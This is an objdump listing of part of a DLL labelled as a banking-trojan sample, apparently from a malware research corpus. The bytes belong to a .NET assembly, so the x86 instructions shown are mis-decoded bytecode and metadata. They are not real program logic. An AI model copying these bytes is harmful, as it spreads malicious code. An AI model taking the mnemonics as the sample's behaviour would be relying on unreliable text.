
malware_samples/banker/de457b1e486958458b4223dd2d0329de1b56300f806b4ed43038fc624fa77dd5.dll:     file format pei-i386


Disassembly of section .text:

10002000 <.text>:
10002000:	d3 50 00             	rcll   %cl,0x0(%eax)
10002003:	00 00                	add    %al,(%eax)
10002005:	00 00                	add    %al,(%eax)
10002007:	00 48 00             	add    %cl,0x0(%eax)
1000200a:	00 00                	add    %al,(%eax)
1000200c:	02 00                	add    (%eax),%al
1000200e:	05 00 98 24 00       	add    $0x249800,%eax
10002013:	00 74 2b 00          	add    %dh,0x0(%ebx,%ebp,1)
10002017:	00 01                	add    %al,(%ecx)
	...
1000204d:	00 00                	add    %al,(%eax)
1000204f:	00 1b                	add    %bl,(%ebx)
10002051:	30 0a                	xor    %cl,(%edx)
10002053:	00 7a 01             	add    %bh,0x1(%edx)
10002056:	00 00                	add    %al,(%eax)
10002058:	01 00                	add    %eax,(%eax)
1000205a:	00 11                	add    %dl,(%ecx)
1000205c:	12 00                	adc    (%eax),%al
1000205e:	fe                   	(bad)
1000205f:	15 04 00 00 02       	adc    $0x2000004,%eax
10002064:	12 00                	adc    (%eax),%al
10002066:	06                   	push   %es
10002067:	28 01                	sub    %al,(%ecx)
10002069:	00 00                	add    %al,(%eax)
1000206b:	2b 7d 05             	sub    0x5(%ebp),%edi
1000206e:	00 00                	add    %al,(%eax)
10002070:	04 12                	add    $0x12,%al
10002072:	01 fe                	add    %edi,%esi
10002074:	15 03 00 00 02       	adc    $0x2000003,%eax
10002079:	28 08                	sub    %cl,(%eax)
1000207b:	00 00                	add    %al,(%eax)
1000207d:	06                   	push   %es
1000207e:	14 7e                	adc    $0x7e,%al
10002080:	11 00                	adc    %eax,(%eax)
10002082:	00 0a                	add    %cl,(%edx)
10002084:	7e 11                	jle    0x10002097
10002086:	00 00                	add    %al,(%eax)
10002088:	0a 16                	or     (%esi),%dl
1000208a:	1a 7e 11             	sbb    0x11(%esi),%bh
1000208d:	00 00                	add    %al,(%eax)
1000208f:	0a 14 12             	or     (%edx,%edx,1),%dl
10002092:	00 12                	add    %dl,(%edx)
10002094:	01 28                	add    %ebp,(%eax)
10002096:	05 00 00 06 2d       	add    $0x2d060000,%eax
1000209b:	01 2a                	add    %ebp,(%edx)
1000209d:	00 07                	add    %al,(%edi)
1000209f:	7b 01                	jnp    0x100020a2
100020a1:	00 00                	add    %al,(%eax)
100020a3:	04 7e                	add    $0x7e,%al
100020a5:	11 00                	adc    %eax,(%eax)
100020a7:	00 0a                	add    %cl,(%edx)
100020a9:	03 8e 69 20 00 30    	add    0x30002069(%esi),%ecx
100020af:	00 00                	add    %al,(%eax)
100020b1:	1f                   	pop    %ds
100020b2:	40                   	inc    %eax
100020b3:	28 03                	sub    %al,(%ebx)
100020b5:	00 00                	add    %al,(%eax)
100020b7:	06                   	push   %es
100020b8:	0c 08                	or     $0x8,%al
100020ba:	7e 11                	jle    0x100020cd
100020bc:	00 00                	add    %al,(%eax)
100020be:	0a 28                	or     (%eax),%ch
100020c0:	12 00                	adc    (%eax),%al
100020c2:	00 0a                	add    %cl,(%edx)
100020c4:	2c 38                	sub    $0x38,%al
100020c6:	28 13                	sub    %dl,(%ebx)
100020c8:	00 00                	add    %al,(%eax)
100020ca:	0a 28                	or     (%eax),%ch
100020cc:	13 00                	adc    (%eax),%eax
100020ce:	00 0a                	add    %cl,(%edx)
100020d0:	72 01                	jb     0x100020d3
100020d2:	00 00                	add    %al,(%eax)
100020d4:	70 28                	jo     0x100020fe
100020d6:	14 00                	adc    $0x0,%al
100020d8:	00 0a                	add    %cl,(%edx)
100020da:	6f                   	outsl  %ds:(%esi),(%dx)
100020db:	15 00 00 0a 72       	adc    $0x720a0000,%eax
100020e0:	d4 04                	aam    $0x4
100020e2:	00 70 72             	add    %dh,0x72(%eax)
100020e5:	ea 04 00 70 6f 16 00 	ljmp   $0x16,$0x6f700004
100020ec:	00 0a                	add    %cl,(%edx)
100020ee:	28 14 00             	sub    %dl,(%eax,%eax,1)
100020f1:	00 0a                	add    %cl,(%edx)
100020f3:	6f                   	outsl  %ds:(%esi),(%dx)
100020f4:	15 00 00 0a 73       	adc    $0x730a0000,%eax
100020f9:	17                   	pop    %ss
100020fa:	00 00                	add    %al,(%eax)
100020fc:	0a 7a 07             	or     0x7(%edx),%bh
100020ff:	7b 01                	jnp    0x10002102
10002101:	00 00                	add    %al,(%eax)
10002103:	04 08                	add    $0x8,%al
10002105:	03 03                	add    (%ebx),%eax
10002107:	8e 69 12             	mov    0x12(%ecx),%gs
1000210a:	04 28                	add    $0x28,%al
1000210c:	07                   	pop    %es
1000210d:	00 00                	add    %al,(%eax)
1000210f:	06                   	push   %es
10002110:	2d 38 28 13 00       	sub    $0x132838,%eax
10002115:	00 0a                	add    %cl,(%edx)
10002117:	28 13                	sub    %dl,(%ebx)
10002119:	00 00                	add    %al,(%eax)
1000211b:	0a 72 ec             	or     -0x14(%edx),%dh
1000211e:	04 00                	add    $0x0,%al
10002120:	70 28                	jo     0x1000214a
10002122:	14 00                	adc    $0x0,%al
10002124:	00 0a                	add    %cl,(%edx)
10002126:	6f                   	outsl  %ds:(%esi),(%dx)
10002127:	15 00 00 0a 72       	adc    $0x720a0000,%eax
1000212c:	27                   	daa
1000212d:	0b 00                	or     (%eax),%eax
1000212f:	70 72                	jo     0x100021a3
10002131:	ea 04 00 70 6f 16 00 	ljmp   $0x16,$0x6f700004
10002138:	00 0a                	add    %cl,(%edx)
1000213a:	28 14 00             	sub    %dl,(%eax,%eax,1)
1000213d:	00 0a                	add    %cl,(%edx)
1000213f:	6f                   	outsl  %ds:(%esi),(%dx)
10002140:	15 00 00 0a 73       	adc    $0x730a0000,%eax
10002145:	17                   	pop    %ss
10002146:	00 00                	add    %al,(%eax)
10002148:	0a 7a 07             	or     0x7(%edx),%bh
1000214b:	7b 01                	jnp    0x1000214e
1000214d:	00 00                	add    %al,(%eax)
1000214f:	04 7e                	add    $0x7e,%al
10002151:	11 00                	adc    %eax,(%eax)
10002153:	00 0a                	add    %cl,(%edx)
10002155:	16                   	push   %ss
10002156:	08 7e 11             	or     %bh,0x11(%esi)
10002159:	00 00                	add    %al,(%eax)
1000215b:	0a 16                	or     (%esi),%dl
1000215d:	12 04 28             	adc    (%eax,%ebp,1),%al
10002160:	06                   	push   %es
10002161:	00 00                	add    %al,(%eax)
10002163:	06                   	push   %es
10002164:	0d 09 7e 11 00       	or     $0x117e09,%eax
10002169:	00 0a                	add    %cl,(%edx)
1000216b:	28 12                	sub    %dl,(%edx)
1000216d:	00 00                	add    %al,(%eax)
1000216f:	0a 2d 45 09 12 06    	or     0x6120945,%ch
10002175:	28 01                	sub    %al,(%ecx)
10002177:	00 00                	add    %al,(%eax)
10002179:	06                   	push   %es
1000217a:	2c 12                	sub    $0x12,%al
1000217c:	11 06                	adc    %eax,(%esi)
1000217e:	20 03                	and    %al,(%ebx)
10002180:	01 00                	add    %eax,(%eax)
10002182:	00 33                	add    %dh,(%ebx)
10002184:	0b 1f                	or     (%edi),%ebx
10002186:	64 28 18             	sub    %bl,%fs:(%eax)
10002189:	00 00                	add    %al,(%eax)
1000218b:	0a 2b                	or     (%ebx),%ch
1000218d:	e4 de                	in     $0xde,%al
1000218f:	45                   	inc    %ebp
10002190:	07                   	pop    %es
10002191:	7b 03                	jnp    0x10002196
10002193:	00 00                	add    %al,(%eax)
10002195:	04 28                	add    $0x28,%al
10002197:	19 00                	sbb    %eax,(%eax)
10002199:	00 0a                	add    %cl,(%edx)
1000219b:	13 05 11 05 6f 1a    	adc    0x1a6f0511,%eax
100021a1:	00 00                	add    %al,(%eax)
100021a3:	0a 16                	or     (%esi),%dl
100021a5:	fe 01                	incb   (%ecx)
100021a7:	2c 07                	sub    $0x7,%al
100021a9:	11 05 6f 1b 00 00    	adc    %eax,0x1b6f
100021af:	0a 09                	or     (%ecx),%cl
100021b1:	28 02                	sub    %al,(%edx)
100021b3:	00 00                	add    %al,(%eax)
100021b5:	06                   	push   %es
100021b6:	26 de 1c 26          	ficomps %es:(%esi,%eiz,1)
100021ba:	de 19                	ficomps (%ecx)
100021bc:	07                   	pop    %es
100021bd:	7b 01                	jnp    0x100021c0
100021bf:	00 00                	add    %al,(%eax)
100021c1:	04 28                	add    $0x28,%al
100021c3:	02 00                	add    (%eax),%al
100021c5:	00 06                	add    %al,(%esi)
100021c7:	26 07                	es pop %es
100021c9:	7b 02                	jnp    0x100021cd
100021cb:	00 00                	add    %al,(%eax)
100021cd:	04 28                	add    $0x28,%al
100021cf:	02 00                	add    (%eax),%al
100021d1:	00 06                	add    %al,(%esi)
100021d3:	26 dc 2a             	fsubrl %es:(%edx)
100021d6:	00 00                	add    %al,(%eax)
100021d8:	41                   	inc    %ecx
100021d9:	34 00                	xor    $0x0,%al
100021db:	00 00                	add    %al,(%eax)
100021dd:	00 00                	add    %al,(%eax)
100021df:	00 42 00             	add    %al,0x0(%edx)
100021e2:	00 00                	add    %al,(%eax)
100021e4:	1b 01                	sbb    (%ecx),%eax
100021e6:	00 00                	add    %al,(%eax)
100021e8:	5d                   	pop    %ebp
100021e9:	01 00                	add    %eax,(%eax)
100021eb:	00 03                	add    %al,(%ebx)
100021ed:	00 00                	add    %al,(%eax)
100021ef:	00 12                	add    %dl,(%edx)
100021f1:	00 00                	add    %al,(%eax)
100021f3:	01 02                	add    %eax,(%edx)
100021f5:	00 00                	add    %al,(%eax)
100021f7:	00 42 00             	add    %al,0x0(%edx)
100021fa:	00 00                	add    %al,(%eax)
100021fc:	1e                   	push   %ds
100021fd:	01 00                	add    %eax,(%eax)
100021ff:	00 60 01             	add    %ah,0x1(%eax)
10002202:	00 00                	add    %al,(%eax)
10002204:	19 00                	sbb    %eax,(%eax)
10002206:	00 00                	add    %al,(%eax)
10002208:	00 00                	add    %al,(%eax)
1000220a:	00 00                	add    %al,(%eax)
1000220c:	13 30                	adc    (%eax),%esi
1000220e:	07                   	pop    %es
1000220f:	00 62 02             	add    %ah,0x2(%edx)
10002212:	00 00                	add    %al,(%eax)
10002214:	02 00                	add    (%eax),%al
10002216:	00 11                	add    %dl,(%ecx)
10002218:	73 09                	jae    0x10002223
1000221a:	00 00                	add    %al,(%eax)
1000221c:	06                   	push   %es
1000221d:	0a 06                	or     (%esi),%al
1000221f:	73 1c                	jae    0x1000223d
10002221:	00 00                	add    %al,(%eax)
10002223:	0a 25 28 13 00 00    	or     0x1328,%ah
10002229:	0a 28                	or     (%eax),%ch
1000222b:	13 00                	adc    (%eax),%eax
1000222d:	00 0a                	add    %cl,(%edx)
1000222f:	72 3d                	jb     0x1000226e
10002231:	0b 00                	or     (%eax),%eax
10002233:	70 28                	jo     0x1000225d
10002235:	14 00                	adc    $0x0,%al
10002237:	00 0a                	add    %cl,(%edx)
10002239:	6f                   	outsl  %ds:(%esi),(%dx)
1000223a:	15 00 00 0a 72       	adc    $0x720a0000,%eax
1000223f:	f0 0c 00             	lock or $0x0,%al
10002242:	70 72                	jo     0x100022b6
10002244:	ea 04 00 70 6f 16 00 	ljmp   $0x16,$0x6f700004
1000224b:	00 0a                	add    %cl,(%edx)
1000224d:	28 14 00             	sub    %dl,(%eax,%eax,1)
10002250:	00 0a                	add    %cl,(%edx)
10002252:	6f                   	outsl  %ds:(%esi),(%dx)
10002253:	15 00 00 0a 6f       	adc    $0x6f0a0000,%eax
10002258:	1d 00 00 0a 25       	sbb    $0x250a0000,%eax
1000225d:	28 13                	sub    %dl,(%ebx)
1000225f:	00 00                	add    %al,(%eax)
10002261:	0a 28                	or     (%eax),%ch
10002263:	13 00                	adc    (%eax),%eax
10002265:	00 0a                	add    %cl,(%edx)
10002267:	72 06                	jb     0x1000226f
10002269:	0d 00 70 28 14       	or     $0x14287000,%eax
1000226e:	00 00                	add    %al,(%eax)
10002270:	0a 6f 15             	or     0x15(%edi),%ch
10002273:	00 00                	add    %al,(%eax)
10002275:	0a 72 b9             	or     -0x47(%edx),%dh
10002278:	0e                   	push   %cs
10002279:	00 70 72             	add    %dh,0x72(%eax)
1000227c:	ea 04 00 70 6f 16 00 	ljmp   $0x16,$0x6f700004
10002283:	00 0a                	add    %cl,(%edx)
10002285:	28 14 00             	sub    %dl,(%eax,%eax,1)
10002288:	00 0a                	add    %cl,(%edx)
1000228a:	6f                   	outsl  %ds:(%esi),(%dx)
1000228b:	15 00 00 0a 6f       	adc    $0x6f0a0000,%eax
10002290:	1d 00 00 0a 25       	sbb    $0x250a0000,%eax
10002295:	28 13                	sub    %dl,(%ebx)
10002297:	00 00                	add    %al,(%eax)
10002299:	0a 28                	or     (%eax),%ch
1000229b:	13 00                	adc    (%eax),%eax
1000229d:	00 0a                	add    %cl,(%edx)
1000229f:	72 cf                	jb     0x10002270
100022a1:	0e                   	push   %cs
100022a2:	00 70 28             	add    %dh,0x28(%eax)
100022a5:	14 00                	adc    $0x0,%al
100022a7:	00 0a                	add    %cl,(%edx)
100022a9:	6f                   	outsl  %ds:(%esi),(%dx)
100022aa:	15 00 00 0a 72       	adc    $0x720a0000,%eax
100022af:	8a 0f                	mov    (%edi),%cl
100022b1:	00 70 72             	add    %dh,0x72(%eax)
100022b4:	ea 04 00 70 6f 16 00 	ljmp   $0x16,$0x6f700004
100022bb:	00 0a                	add    %cl,(%edx)
100022bd:	28 14 00             	sub    %dl,(%eax,%eax,1)
100022c0:	00 0a                	add    %cl,(%edx)
100022c2:	6f                   	outsl  %ds:(%esi),(%dx)
100022c3:	15 00 00 0a 6f       	adc    $0x6f0a0000,%eax
100022c8:	1d 00 00 0a 25       	sbb    $0x250a0000,%eax
100022cd:	28 13                	sub    %dl,(%ebx)
100022cf:	00 00                	add    %al,(%eax)
100022d1:	0a 28                	or     (%eax),%ch
100022d3:	13 00                	adc    (%eax),%eax
100022d5:	00 0a                	add    %cl,(%edx)
100022d7:	72 a0                	jb     0x10002279
100022d9:	0f 00                	(bad)
100022db:	70 28                	jo     0x10002305
100022dd:	14 00                	adc    $0x0,%al
100022df:	00 0a                	add    %cl,(%edx)
100022e1:	6f                   	outsl  %ds:(%esi),(%dx)
100022e2:	15 00 00 0a 72       	adc    $0x720a0000,%eax
100022e7:	5b                   	pop    %ebx
100022e8:	10 00                	adc    %al,(%eax)
100022ea:	70 72                	jo     0x1000235e
100022ec:	ea 04 00 70 6f 16 00 	ljmp   $0x16,$0x6f700004
100022f3:	00 0a                	add    %cl,(%edx)
100022f5:	28 14 00             	sub    %dl,(%eax,%eax,1)
100022f8:	00 0a                	add    %cl,(%edx)
100022fa:	6f                   	outsl  %ds:(%esi),(%dx)
100022fb:	15 00 00 0a 6f       	adc    $0x6f0a0000,%eax
10002300:	1d 00 00 0a 25       	sbb    $0x250a0000,%eax
10002305:	28 13                	sub    %dl,(%ebx)
10002307:	00 00                	add    %al,(%eax)
10002309:	0a 28                	or     (%eax),%ch
1000230b:	13 00                	adc    (%eax),%eax
1000230d:	00 0a                	add    %cl,(%edx)
1000230f:	72 71                	jb     0x10002382
10002311:	10 00                	adc    %al,(%eax)
10002313:	70 28                	jo     0x1000233d
10002315:	14 00                	adc    $0x0,%al
10002317:	00 0a                	add    %cl,(%edx)
10002319:	6f                   	outsl  %ds:(%esi),(%dx)
1000231a:	15 00 00 0a 72       	adc    $0x720a0000,%eax
1000231f:	6c                   	insb   (%dx),%es:(%edi)
10002320:	11 00                	adc    %eax,(%eax)
10002322:	70 72                	jo     0x10002396
10002324:	ea 04 00 70 6f 16 00 	ljmp   $0x16,$0x6f700004
1000232b:	00 0a                	add    %cl,(%edx)
1000232d:	28 14 00             	sub    %dl,(%eax,%eax,1)
10002330:	00 0a                	add    %cl,(%edx)
10002332:	6f                   	outsl  %ds:(%esi),(%dx)
10002333:	15 00 00 0a 6f       	adc    $0x6f0a0000,%eax
10002338:	1d 00 00 0a 25       	sbb    $0x250a0000,%eax
1000233d:	28 13                	sub    %dl,(%ebx)
1000233f:	00 00                	add    %al,(%eax)
10002341:	0a 28                	or     (%eax),%ch
10002343:	13 00                	adc    (%eax),%eax
10002345:	00 0a                	add    %cl,(%edx)
10002347:	72 82                	jb     0x100022cb
10002349:	11 00                	adc    %eax,(%eax)
1000234b:	70 28                	jo     0x10002375
1000234d:	14 00                	adc    $0x0,%al
1000234f:	00 0a                	add    %cl,(%edx)
10002351:	6f                   	outsl  %ds:(%esi),(%dx)
10002352:	15 00 00 0a 72       	adc    $0x720a0000,%eax
10002357:	fc                   	cld
10002358:	11 00                	adc    %eax,(%eax)
1000235a:	70 72                	jo     0x100023ce
1000235c:	ea 04 00 70 6f 16 00 	ljmp   $0x16,$0x6f700004
10002363:	00 0a                	add    %cl,(%edx)
10002365:	28 14 00             	sub    %dl,(%eax,%eax,1)
10002368:	00 0a                	add    %cl,(%edx)
1000236a:	6f                   	outsl  %ds:(%esi),(%dx)
1000236b:	15 00 00 0a 6f       	adc    $0x6f0a0000,%eax
10002370:	1d 00 00 0a 25       	sbb    $0x250a0000,%eax
10002375:	28 13                	sub    %dl,(%ebx)
10002377:	00 00                	add    %al,(%eax)
10002379:	0a 28                	or     (%eax),%ch
1000237b:	13 00                	adc    (%eax),%eax
1000237d:	00 0a                	add    %cl,(%edx)
1000237f:	72 12                	jb     0x10002393
10002381:	12 00                	adc    (%eax),%al
10002383:	70 28                	jo     0x100023ad
10002385:	14 00                	adc    $0x0,%al
10002387:	00 0a                	add    %cl,(%edx)
10002389:	6f                   	outsl  %ds:(%esi),(%dx)
1000238a:	15 00 00 0a 72       	adc    $0x720a0000,%eax
1000238f:	85 13                	test   %edx,(%ebx)
10002391:	00 70 72             	add    %dh,0x72(%eax)
10002394:	ea 04 00 70 6f 16 00 	ljmp   $0x16,$0x6f700004
1000239b:	00 0a                	add    %cl,(%edx)
1000239d:	28 14 00             	sub    %dl,(%eax,%eax,1)
100023a0:	00 0a                	add    %cl,(%edx)
100023a2:	6f                   	outsl  %ds:(%esi),(%dx)
100023a3:	15 00 00 0a 6f       	adc    $0x6f0a0000,%eax
100023a8:	1d 00 00 0a 25       	sbb    $0x250a0000,%eax
100023ad:	28 13                	sub    %dl,(%ebx)
100023af:	00 00                	add    %al,(%eax)
100023b1:	0a 28                	or     (%eax),%ch
100023b3:	13 00                	adc    (%eax),%eax
100023b5:	00 0a                	add    %cl,(%edx)
100023b7:	72 9b                	jb     0x10002354
100023b9:	13 00                	adc    (%eax),%eax
100023bb:	70 28                	jo     0x100023e5
100023bd:	14 00                	adc    $0x0,%al
100023bf:	00 0a                	add    %cl,(%edx)
100023c1:	6f                   	outsl  %ds:(%esi),(%dx)
100023c2:	15 00 00 0a 72       	adc    $0x720a0000,%eax
100023c7:	96                   	xchg   %eax,%esi
100023c8:	14 00                	adc    $0x0,%al
100023ca:	70 72                	jo     0x1000243e
100023cc:	ea 04 00 70 6f 16 00 	ljmp   $0x16,$0x6f700004
100023d3:	00 0a                	add    %cl,(%edx)
100023d5:	28 14 00             	sub    %dl,(%eax,%eax,1)
100023d8:	00 0a                	add    %cl,(%edx)
100023da:	6f                   	outsl  %ds:(%esi),(%dx)
100023db:	15 00 00 0a 6f       	adc    $0x6f0a0000,%eax
100023e0:	1d 00 00 0a 7d       	sbb    $0x7d0a0000,%eax
100023e5:	17                   	pop    %ss
100023e6:	00 00                	add    %al,(%eax)
100023e8:	04 28                	add    $0x28,%al
100023ea:	13 00                	adc    (%eax),%eax
100023ec:	00 0a                	add    %cl,(%edx)
100023ee:	28 13                	sub    %dl,(%ebx)
100023f0:	00 00                	add    %al,(%eax)
100023f2:	0a 72 ac             	or     -0x54(%edx),%dh
100023f5:	14 00                	adc    $0x0,%al
100023f7:	70 28                	jo     0x10002421
100023f9:	14 00                	adc    $0x0,%al
100023fb:	00 0a                	add    %cl,(%edx)
100023fd:	6f                   	outsl  %ds:(%esi),(%dx)
100023fe:	15 00 00 0a 72       	adc    $0x720a0000,%eax
10002403:	2f                   	das
10002404:	1a 00                	sbb    (%eax),%al
10002406:	70 72                	jo     0x1000247a
10002408:	ea 04 00 70 6f 16 00 	ljmp   $0x16,$0x6f700004
1000240f:	00 0a                	add    %cl,(%edx)
10002411:	28 14 00             	sub    %dl,(%eax,%eax,1)
10002414:	00 0a                	add    %cl,(%edx)
10002416:	6f                   	outsl  %ds:(%esi),(%dx)
10002417:	15 00 00 0a 28       	adc    $0x280a0000,%eax
1000241c:	13 00                	adc    (%eax),%eax
1000241e:	00 0a                	add    %cl,(%edx)
10002420:	28 13                	sub    %dl,(%ebx)
10002422:	00 00                	add    %al,(%eax)
10002424:	0a 72 45             	or     0x45(%edx),%dh
10002427:	1a 00                	sbb    (%eax),%al
10002429:	70 28                	jo     0x10002453
1000242b:	14 00                	adc    $0x0,%al
1000242d:	00 0a                	add    %cl,(%edx)
1000242f:	6f                   	outsl  %ds:(%esi),(%dx)
10002430:	15 00 00 0a 72       	adc    $0x720a0000,%eax
10002435:	00 1b                	add    %bl,(%ebx)
10002437:	00 70 72             	add    %dh,0x72(%eax)
1000243a:	ea 04 00 70 6f 16 00 	ljmp   $0x16,$0x6f700004
10002441:	00 0a                	add    %cl,(%edx)
10002443:	28 14 00             	sub    %dl,(%eax,%eax,1)
10002446:	00 0a                	add    %cl,(%edx)
10002448:	6f                   	outsl  %ds:(%esi),(%dx)
10002449:	15 00 00 0a 17       	adc    $0x170a0000,%eax
1000244e:	28 1e                	sub    %bl,(%esi)
10002450:	00 00                	add    %al,(%eax)
10002452:	0a 06                	or     (%esi),%al
10002454:	fe 06                	incb   (%esi)
10002456:	0a 00                	or     (%eax),%al
10002458:	00 06                	add    %al,(%esi)
1000245a:	73 1f                	jae    0x1000247b
1000245c:	00 00                	add    %al,(%eax)
1000245e:	0a 28                	or     (%eax),%ch
10002460:	02 00                	add    (%eax),%al
10002462:	00 2b                	add    %ch,(%ebx)
10002464:	28 03                	sub    %al,(%ebx)
10002466:	00 00                	add    %al,(%eax)
10002468:	2b 0b                	sub    (%ebx),%ecx
1000246a:	07                   	pop    %es
1000246b:	73 22                	jae    0x1000248f
1000246d:	00 00                	add    %al,(%eax)
1000246f:	0a 07                	or     (%edi),%al
10002471:	8e 69 6f             	mov    0x6f(%ecx),%gs
10002474:	23 00                	and    (%eax),%eax
10002476:	00 0a                	add    %cl,(%edx)
10002478:	9a 2a 1e 02 28 24 00 	lcall  $0x24,$0x28021e2a
1000247f:	00 0a                	add    %cl,(%edx)
10002481:	2a 4a 02             	sub    0x2(%edx),%cl
10002484:	7b 17                	jnp    0x1000249d
10002486:	00 00                	add    %al,(%eax)
10002488:	04 03                	add    $0x3,%al
1000248a:	28 25 00 00 0a 6f    	sub    %ah,0x6f0a0000
10002490:	26 00 00             	add    %al,%es:(%eax)
10002493:	0a 2a                	or     (%edx),%ch
10002495:	00 00                	add    %al,(%eax)
10002497:	00 42 53             	add    %al,0x53(%edx)
1000249a:	4a                   	dec    %edx
1000249b:	42                   	inc    %edx
1000249c:	01 00                	add    %eax,(%eax)
1000249e:	01 00                	add    %eax,(%eax)
100024a0:	00 00                	add    %al,(%eax)
100024a2:	00 00                	add    %al,(%eax)
100024a4:	0c 00                	or     $0x0,%al
100024a6:	00 00                	add    %al,(%eax)
100024a8:	76 34                	jbe    0x100024de
100024aa:	2e 30 2e             	xor    %ch,%cs:(%esi)
100024ad:	33 30                	xor    (%eax),%esi
100024af:	33 31                	xor    (%ecx),%esi
100024b1:	39 00                	cmp    %eax,(%eax)
100024b3:	00 00                	add    %al,(%eax)
100024b5:	00 05 00 6c 00 00    	add    %al,0x6c00
100024bb:	00 3c 05 00 00 23 7e 	add    %bh,0x7e230000(,%eax,1)
100024c2:	00 00                	add    %al,(%eax)
100024c4:	a8 05                	test   $0x5,%al
100024c6:	00 00                	add    %al,(%eax)
100024c8:	88 08                	mov    %cl,(%eax)
100024ca:	00 00                	add    %al,(%eax)
100024cc:	23 53 74             	and    0x74(%ebx),%edx
100024cf:	72 69                	jb     0x1000253a
100024d1:	6e                   	outsb  %ds:(%esi),(%dx)
100024d2:	67 73 00             	addr16 jae 0x100024d5
100024d5:	00 00                	add    %al,(%eax)
100024d7:	00 30                	add    %dh,(%eax)
100024d9:	0e                   	push   %cs
100024da:	00 00                	add    %al,(%eax)
100024dc:	18 1b                	sbb    %bl,(%ebx)
100024de:	00 00                	add    %al,(%eax)
100024e0:	23 55 53             	and    0x53(%ebp),%edx
100024e3:	00 48 29             	add    %cl,0x29(%eax)
100024e6:	00 00                	add    %al,(%eax)
100024e8:	10 00                	adc    %al,(%eax)
100024ea:	00 00                	add    %al,(%eax)
100024ec:	23 47 55             	and    0x55(%edi),%eax
100024ef:	49                   	dec    %ecx
100024f0:	44                   	inc    %esp
100024f1:	00 00                	add    %al,(%eax)
100024f3:	00 58 29             	add    %bl,0x29(%eax)
100024f6:	00 00                	add    %al,(%eax)
100024f8:	1c 02                	sbb    $0x2,%al
100024fa:	00 00                	add    %al,(%eax)
100024fc:	23 42 6c             	and    0x6c(%edx),%eax
100024ff:	6f                   	outsl  %ds:(%esi),(%dx)
10002500:	62 00                	bound  %eax,(%eax)
10002502:	00 00                	add    %al,(%eax)
10002504:	00 00                	add    %al,(%eax)
10002506:	00 00                	add    %al,(%eax)
10002508:	02 00                	add    (%eax),%al
1000250a:	00 01                	add    %al,(%ecx)
1000250c:	57                   	push   %edi
1000250d:	15 02 1c 09 0a       	adc    $0xa091c02,%eax
10002512:	00 00                	add    %al,(%eax)
10002514:	00 fa                	add    %bh,%dl
10002516:	01 33                	add    %esi,(%ebx)
10002518:	00 16                	add    %dl,(%esi)
1000251a:	00 00                	add    %al,(%eax)
1000251c:	01 00                	add    %eax,(%eax)
1000251e:	00 00                	add    %al,(%eax)
10002520:	22 00                	and    (%eax),%al
10002522:	00 00                	add    %al,(%eax)
10002524:	05 00 00 00 17       	add    $0x17000000,%eax
10002529:	00 00                	add    %al,(%eax)
1000252b:	00 0a                	add    %cl,(%edx)
1000252d:	00 00                	add    %al,(%eax)
1000252f:	00 21                	add    %ah,(%ecx)
10002531:	00 00                	add    %al,(%eax)
10002533:	00 26                	add    %ah,(%esi)
10002535:	00 00                	add    %al,(%eax)
10002537:	00 10                	add    %dl,(%eax)
10002539:	00 00                	add    %al,(%eax)
1000253b:	00 02                	add    %al,(%edx)
1000253d:	00 00                	add    %al,(%eax)
1000253f:	00 01                	add    %al,(%ecx)
10002541:	00 00                	add    %al,(%eax)
10002543:	00 02                	add    %al,(%edx)
10002545:	00 00                	add    %al,(%eax)
10002547:	00 06                	add    %al,(%esi)
10002549:	00 00                	add    %al,(%eax)
1000254b:	00 01                	add    %al,(%ecx)
1000254d:	00 00                	add    %al,(%eax)
1000254f:	00 03                	add    %al,(%ebx)
10002551:	00 00                	add    %al,(%eax)
10002553:	00 03                	add    %al,(%ebx)
10002555:	00 00                	add    %al,(%eax)
10002557:	00 03                	add    %al,(%ebx)
10002559:	00 00                	add    %al,(%eax)
1000255b:	00 00                	add    %al,(%eax)
1000255d:	00 8a 06 01 00 00    	add    %cl,0x106(%edx)
10002563:	00 00                	add    %al,(%eax)
10002565:	00 06                	add    %al,(%esi)
10002567:	00 44 05 7d          	add    %al,0x7d(%ebp,%eax,1)
1000256b:	07                   	pop    %es
1000256c:	06                   	push   %es
1000256d:	00 b1 05 7d 07 06    	add    %dh,0x6077d05(%ecx)
10002573:	00 78 04             	add    %bh,0x4(%eax)
10002576:	4b                   	dec    %ebx
10002577:	07                   	pop    %es
10002578:	0f 00 9d 07 00 00 06 	ltr    0x6000007(%ebp)
1000257f:	00 a0 04 cc 06 06    	add    %ah,0x606cc04(%eax)
10002585:	00 27                	add    %ah,(%edi)
10002587:	05 cc 06 06 00       	add    $0x606cc,%eax
1000258c:	08 05 cc 06 06 00    	or     %al,0x606cc
10002592:	98                   	cwtl
10002593:	05 cc 06 06 00       	add    $0x606cc,%eax
10002598:	64 05 cc 06 06 00    	fs add $0x606cc,%eax
1000259e:	7d 05                	jge    0x100025a5
100025a0:	cc                   	int3
100025a1:	06                   	push   %es
100025a2:	06                   	push   %es
100025a3:	00 b7 04 cc 06 06    	add    %dh,0x606cc04(%edi)
100025a9:	00 8c 04 5e 07 06 00 	add    %cl,0x6075e(%esp,%eax,1)
100025b0:	6a 04                	push   $0x4
100025b2:	5e                   	pop    %esi
100025b3:	07                   	pop    %es
100025b4:	06                   	push   %es
100025b5:	00 eb                	add    %ch,%bl
100025b7:	04 cc                	add    $0xcc,%al
100025b9:	06                   	push   %es
100025ba:	06                   	push   %es
100025bb:	00 d2                	add    %dl,%dl
100025bd:	04 00                	add    $0x0,%al
100025bf:	06                   	push   %es
100025c0:	06                   	push   %es
100025c1:	00 f2                	add    %dh,%dl
100025c3:	07                   	pop    %es
100025c4:	a2 06 0a 00 db       	mov    %al,0xdb000a06
100025c9:	07                   	pop    %es
100025ca:	4b                   	dec    %ebx
100025cb:	07                   	pop    %es
100025cc:	06                   	push   %es
100025cd:	00 eb                	add    %ch,%bl
100025cf:	06                   	push   %es
100025d0:	a2 06 06 00 4f       	mov    %al,0x4f000606
100025d5:	04 7d                	add    $0x7d,%al
100025d7:	07                   	pop    %es
100025d8:	06                   	push   %es
100025d9:	00 33                	add    %dh,(%ebx)
100025db:	04 a2                	add    $0xa2,%al
100025dd:	06                   	push   %es
100025de:	06                   	push   %es
100025df:	00 86 00 9a 03 06    	add    %al,0x6039a00(%esi)
100025e5:	00 63 06             	add    %ah,0x6(%ebx)
100025e8:	5e                   	pop    %esi
100025e9:	07                   	pop    %es
100025ea:	06                   	push   %es
100025eb:	00 44 07 a2          	add    %al,-0x5e(%edi,%eax,1)
100025ef:	06                   	push   %es
100025f0:	06                   	push   %es
100025f1:	00 f7                	add    %dh,%bh
100025f3:	05 06 08 06 00       	add    $0x60806,%eax
100025f8:	f9                   	stc
